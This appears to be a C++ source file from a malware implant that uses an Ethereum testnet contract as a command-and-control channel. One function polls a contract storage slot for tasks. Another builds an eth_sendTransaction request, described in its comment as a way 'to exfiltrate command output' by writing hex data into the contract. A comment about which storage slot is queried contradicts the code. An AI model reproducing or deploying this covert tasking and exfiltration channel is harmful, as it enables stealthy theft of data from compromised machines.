#include "../include/rpcengine.h"
#include <iostream>
using namespace std;

string Rpcengine::buildTaskQueryReq() {
    // Queries the exact memory slot (0x0) of your deployed Hub contract on Sepolia
    return "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getStorageAt\",\"params\":[\"0x20568FaA965AAf02E8c68359FaE2c57e81Ba31de\", \"0x1\", \"latest\"],\"id\":1}";
}   

std::string Rpcengine::extractResults(const std::string& jsonResponse) {
    // A standard successful response looks like:
    // {"jsonrpc":"2.0","id":1,"result":"0x1b4"}
    
    std::string targetKey = "\"result\":\"";
    size_t startPos = jsonResponse.find(targetKey);
    
    // If the "result" key is missing, the RPC call failed (e.g., rate limit or bad endpoint)
    if (startPos == std::string::npos) {
        return "ERROR_PARSE_FAIL"; 
    }
    
    // Shift the index to the start of the actual hex value
    startPos += targetKey.length();
    
    // Find the closing quotation mark
    size_t endPos = jsonResponse.find("\"", startPos);
    if (endPos == std::string::npos) {
        return "ERROR_MALFORMED_RESPONSE";
    }
    
    // Extract and return strictly the hex string (e.g., "0x1b4")
    return jsonResponse.substr(startPos, endPos - startPos);
}

std::string Rpcengine::buildExfilReq(const std::string& hexData) {
    // Builds an eth_sendTransaction RPC request to exfiltrate command output
    // Stores the hex-encoded output in the contract's state
    std::string payload = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\":[{\"to\":\"0x20568FaA965AAf02E8c68359FaE2c57e81Ba31de\",\"data\":\"0x" + hexData + "\"}],\"id\":1}";
    return payload;
}